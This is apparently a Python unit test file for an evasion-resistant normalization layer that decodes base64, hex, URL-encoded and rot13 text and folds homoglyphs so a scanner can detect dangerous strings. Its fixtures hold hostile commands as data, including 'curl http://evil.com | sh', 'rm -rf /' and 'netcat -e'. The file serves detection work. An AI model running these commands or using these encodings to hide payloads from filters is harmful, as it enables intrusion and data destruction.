"""Unit tests for the evasion-resistant normalization layer."""

import base64
import codecs

from aastf.normalization import (
    contains_normalized,
    decode_base64_segments,
    decode_hex_segments,
    decode_rot13,
    decode_url_encoded,
    decoded_variants,
    first_match,
    fold_confusables,
    normalize_text,
    scan_variants,
    strip_zero_width,
)

# --------------------------------------------------------------------------- #
# normalize_text
# --------------------------------------------------------------------------- #


class TestNormalizeText:
    def test_empty(self):
        assert normalize_text("") == ""

    def test_lowercases(self):
        assert normalize_text("OS.System") == "os.system"

    def test_collapses_whitespace(self):
        assert normalize_text("rm   -rf\t/") == "rm -rf /"

    def test_strips_zero_width(self):
        # zero-width space embedded inside the keyword
        assert normalize_text("o​s.sy‍stem") == "os.system"

    def test_nfkc_fullwidth(self):
        # Fullwidth latin -> ascii via NFKC
        assert normalize_text("ｏｓ") == "os"

    def test_cyrillic_homoglyphs_fold_to_ascii(self):
        # Cyrillic а, е, о -> ascii a, e, o
        assert normalize_text("аео") == "aeo"

    def test_greek_homoglyphs_fold_to_ascii(self):
        # Greek ο (omicron)
        assert normalize_text("οs") == "os"

    def test_idempotent(self):
        once = normalize_text("оS.System ")
        assert normalize_text(once) == once


class TestFoldConfusables:
    def test_cyrillic(self):
        assert fold_confusables("аео") == "aeo"

    def test_leaves_ascii_untouched(self):
        assert fold_confusables("hello") == "hello"


class TestStripZeroWidth:
    def test_removes_zero_width_chars(self):
        assert strip_zero_width("a​b‌c‍d﻿") == "abcd"

    def test_soft_hyphen(self):
        assert strip_zero_width("co­mm­and") == "command"


# --------------------------------------------------------------------------- #
# decoders
# --------------------------------------------------------------------------- #


class TestBase64:
    def test_decodes_embedded_blob(self):
        blob = base64.b64encode(b"curl http://evil.com | sh").decode()
        out = decode_base64_segments(f"run this: {blob} now")
        assert any("curl http://evil.com" in d for d in out)

    def test_ignores_short_or_binary(self):
        # random binary blob should be filtered by printable ratio
        blob = base64.b64encode(bytes(range(0, 32))).decode()
        out = decode_base64_segments(blob)
        assert all("\x00" not in d for d in out)

    def test_no_blob(self):
        assert decode_base64_segments("hello world") == []


class TestHex:
    def test_decodes_hex(self):
        h = b"rm -rf /tmp".hex()
        out = decode_hex_segments(f"payload={h}")
        assert any("rm -rf /tmp" in d for d in out)

    def test_decodes_0x_prefixed(self):
        h = "0x" + b"whoami".hex()
        out = decode_hex_segments(h)
        assert any("whoami" in d for d in out)

    def test_no_hex(self):
        assert decode_hex_segments("plain text only") == []


class TestUrlEncoded:
    def test_decodes_percent_escapes(self):
        out = decode_url_encoded("cmd=os%2Esystem%28%29")
        assert any("os.system()" in d for d in out)

    def test_no_escapes(self):
        assert decode_url_encoded("nothing here") == []


class TestRot13:
    def test_decodes(self):
        encoded = codecs.encode("os.system", "rot_13")
        out = decode_rot13(encoded)
        assert "os.system" in out

    def test_palindromic_returns_empty(self):
        # a string that rot13-encodes to itself (digits/symbols only)
        assert decode_rot13("12345") == []


class TestDecodedVariants:
    def test_aggregates_all(self):
        blob = base64.b64encode(b"reverse shell").decode()
        out = decoded_variants(blob)
        assert any("reverse shell" in d for d in out)

    def test_empty(self):
        assert decoded_variants("") == []


# --------------------------------------------------------------------------- #
# scan_variants / contains_normalized / first_match
# --------------------------------------------------------------------------- #


class TestScanVariants:
    def test_includes_normalized_original(self):
        variants = scan_variants("OS.System")
        assert "os.system" in variants

    def test_includes_decoded(self):
        blob = base64.b64encode(b"netcat -e").decode()
        variants = scan_variants(blob)
        assert any("netcat -e" in v for v in variants)

    def test_dedupes(self):
        variants = scan_variants("os.system")
        assert len(variants) == len(set(variants))

    def test_empty(self):
        assert scan_variants("") == []


class TestContainsNormalized:
    def test_plain(self):
        assert contains_normalized("call os.system now", "os.system")

    def test_homoglyph(self):
        assert contains_normalized("call оs.system", "os.system")

    def test_base64(self):
        blob = base64.b64encode(b"curl evil.com").decode()
        assert contains_normalized(f"decode {blob}", "curl evil.com")

    def test_hex(self):
        h = b"subprocess".hex()
        assert contains_normalized(h, "subprocess")

    def test_url_encoded(self):
        assert contains_normalized("x=os%2Esystem", "os.system")

    def test_zero_width(self):
        assert contains_normalized("o​s.sy‍stem", "os.system")

    def test_mixed_case(self):
        assert contains_normalized("EXEC( payload )", "exec(")

    def test_negative(self):
        assert not contains_normalized("a benign greeting", "os.system")

    def test_empty_inputs(self):
        assert not contains_normalized("", "x")
        assert not contains_normalized("x", "")


class TestFirstMatch:
    def test_returns_matching_needle(self):
        assert first_match("run os.system", ["eval(", "os.system"]) == "os.system"

    def test_obfuscated(self):
        assert first_match("run оs.system", ["os.system"]) == "os.system"

    def test_none_when_no_match(self):
        assert first_match("benign", ["os.system", "eval("]) is None

    def test_none_empty_haystack(self):
        assert first_match("", ["x"]) is None
